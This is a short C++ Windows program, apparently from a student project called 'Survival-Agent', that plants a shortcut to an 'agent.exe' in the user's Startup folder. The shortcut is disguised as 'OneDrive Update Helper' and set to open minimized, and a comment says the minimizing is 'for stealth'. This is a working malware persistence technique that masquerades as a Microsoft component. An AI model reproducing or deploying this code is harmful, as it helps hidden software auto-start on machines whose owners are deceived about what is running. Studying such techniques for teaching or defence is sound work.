#include <windows.h>
#include <shlobj.h>
#include <iostream>

// Logic: Create a shell link (shortcut) in the Startup folder
void CreateStartupShortcut(LPCSTR targetPath, LPCSTR shortcutName) {
    HRESULT hres;
    IShellLink* psl;

    // Initialize the COM library
    CoInitialize(NULL);

    // Get a pointer to the IShellLink interface
    hres = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (LPVOID*)&psl);
    
    if (SUCCEEDED(hres)) {
        IPersistFile* ppf;

        // Set the path to the shortcut target (your agent.exe)
        psl->SetPath(targetPath);
        psl->SetDescription("OneDrive Update Helper");
        psl->SetShowCmd(SW_SHOWMINNOACTIVE); // Minimized for stealth

        // Query IShellLink for the IPersistFile interface for saving the shortcut
        hres = psl->QueryInterface(IID_IPersistFile, (LPVOID*)&ppf);

        if (SUCCEEDED(hres)) {
            WCHAR wsz[MAX_PATH];
            
            // Get the path to the Startup folder
            char startupPath[MAX_PATH];
            SHGetSpecialFolderPathA(NULL, startupPath, CSIDL_STARTUP, FALSE);
            
            std::string fullPath = std::string(startupPath) + "\\" + shortcutName + ".lnk";
            MultiByteToWideChar(CP_ACP, 0, fullPath.c_str(), -1, wsz, MAX_PATH);

            // Save the link by calling IPersistFile::Save
            hres = ppf->Save(wsz, TRUE);
            ppf->Release();
        }
        psl->Release();
    }
    CoUninitialize();
}

int main() {
    LPCSTR myAgent = "C:\\Users\\abdul\\Downloads\\FYP\\Survival-Agent\\agent.exe";
    CreateStartupShortcut(myAgent, "OneDriveUpdateHelper");
    return 0;
}